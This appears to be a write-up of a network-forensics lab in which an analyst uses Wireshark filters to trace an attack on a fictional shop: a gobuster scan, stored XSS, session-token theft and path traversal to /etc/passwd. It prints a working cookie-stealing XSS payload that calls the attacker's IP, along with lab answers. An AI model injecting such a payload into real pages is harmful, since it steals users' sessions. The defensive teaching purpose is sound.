# Synopsis
In recent days, ShopSphere, a prominent online retail platform, has experienced unusual administrative login activity during late-night hours. These logins coincide with an influx of customer complaints about unexplained account anomalies, raising concerns about a potential security breach. Initial observations suggest unauthorized access to administrative accounts, potentially indicating deeper system compromise.

Your mission is to investigate the captured network traffic to determine the nature and source of the breach. Identifying how the attackers infiltrated the system and pinpointing their methods will be critical to understanding the attack's scope and mitigating its impact.

## Question 1 Identifying an attacker's IP address is crucial for mapping the attack's extent and planning an effective response. What is the attacker's IP address?
When beginning the investigation into the web attack we can determine the Malicious ip in question through its interaction with the web server. This can be identified in two ways, we know the user is targeting the administrative login, the attacker could identify this login functionality through searching for
common naming conventions specifically for admin functioanlity in a website. This can be done through passing a targeted wordlist to gobuster, a brute force tool used to identify pages on a website. We can see that a particular ip has made many requests to different pages all related to the term admin. This can be filtered using `http.request.full_uri contains "admin"`

![image](https://github.com/user-attachments/assets/46a5708a-bc16-4b00-b690-0076f38b64bc)

Oddly there are two IP's available in these results, this is common in packet captures of real web servers, it is crucial we can identify which of the two IP's is
a safe user and which IP belongs to a malicious actor. Looking closely at the packets can help us determine that one of the IP's has a User-Agent related to the fireox browser whilst the other users User-Agent belongs to gobuster, which indicates the attacker is trying to enumerate the login functionality.

Safe User-Agent:
![image](https://github.com/user-attachments/assets/a018b5ff-48ac-4b77-b4af-253876791a29)

Malicious TUser-Agent:
![image](https://github.com/user-attachments/assets/00692363-8af7-4ad2-82f4-d5177960b444)

Answer:111.224.180.128

## Question 2 The attacker used a directory brute-forcing tool to discover hidden paths. Which tool did the attacker use to perform the brute-forcing?
Answered previously we know the brute forcing tool from the User-Agent
Answer:gobuster

## Question 3 Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?

With knowledge of the attackers IP and the use of XSS we can filter for known XSS tags such as `<script>` within the http protocol, to narrow this down to finding
XSS payloads being submitted we can look for POST requests being made, where the payload is supplied through a form input.

The final query is `ip.src == 111.224.180.128 and http contains "script" and http.request.method == POST`
![image](https://github.com/user-attachments/assets/e423c081-e70a-49b4-8cf1-d872c378fa40)

Drilling down into the request we can see a parameter review, likely used to submit reviews, with an input which has an XSS payload which after URL decoding the
characters is <script>fetch('http://111.224.180.128/' + document.cookie);</script>

Answer: <script>fetch('http://111.224.180.128/' + document.cookie);</script>

## Question 4 Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?
With knowledge of a stored XSS being available on the page being submitted to, we can use the page name as a way to identify any traffic to that page, anything occuring after the stored xss is likely to have triggered the XSS payload and their cookie has been sent to the attacker.

Filter: `http.request.full_uri contains "reviews.php"`

![image](https://github.com/user-attachments/assets/f77ad11f-04a5-4252-8e58-63c4b4c60613)


We can see that after the stored XSS the IP 135.143.142.5 accessed the reviews page, triggering the XSS payload

Answer: 2024-03-29 12:09

## Question 5 The theft of a session token through XSS is a serious security breach that allows unauthorized access. Can you provide the session token that the attacker acquired and used for this unauthorized access?

Since the server likely uses Cookies to maintain sessions the token is likely being transmitted by the clients browser each time they request the page it will be sent to the server, unless the attacker was able to eavesdrop between the server and client and view the packets internally, the only other way they can access the token is to send it over as they have. We can view the Traffic and therefore can see the Cookie section contains the clients cookie
![image](https://github.com/user-attachments/assets/87505fd7-24e9-4451-82cd-12f2deea0617)

Answer: lqkctf24s9h9lg67teu8uevn3q

## Question 6 Identifying which scripts have been exploited is crucial for mitigating vulnerabilities in a web application. What is the name of the script that was exploited by the attacker?
We can see in the traffic that the attacker made a strange request using directory traversal sequences, indicative of a Path Traversal attack.

Typically when an attacker wants to access a sensitive system file they will attempt to use Directory Traversal sequences to move from the intended folder into any
file on the web servers filesystem. These utilise the `../` notation to represent moving up a directory in the file system, these can be used many times to traverse many parent directories and if additional ones are present they will remain in the final top directory known as the root. Then they can supply their own
filenames to common files on the server to extract information for further pivoting.

Knowing the request is likely to contain a directory traversal sequence we can filter for this in the request using `http.request.full_uri contains "../"
We see a result which uses a directory traversal vulnerabiity to access the `/etc/passwd` file used to store usernames and their hashes. Giving the attacker
access to usernames he can possibly use to perform lateral movement or privilege escalation
![image](https://github.com/user-attachments/assets/41f03ce2-07f5-4b32-ab61-354d10562b93)

We can see the page the attacker has submitted this to.

Answer: log_viewer.php
## Question 7 Exploiting vulnerabilities to access sensitive system files is a common tactic used by attackers. Can you identify the specific payload the attacker used to access a sensitive system file?
Answered in the previous question the file /etc/passwd was accessed and we can verify if the attacker successfully accessed the file.

Following the HTTP stream we can see the server returned the files contents
![image](https://github.com/user-attachments/assets/c0f81666-65a8-470b-86f8-74741c7286df)

Answer: /etc/passwd

# Conclusion
This lab involved using wireshark filters to identify several web attacks being conducted on a network to determine what impact the attacker had and what steps were taken. This involved outlining the attack chain utilised and the artefacts that were obtained by the attacker.


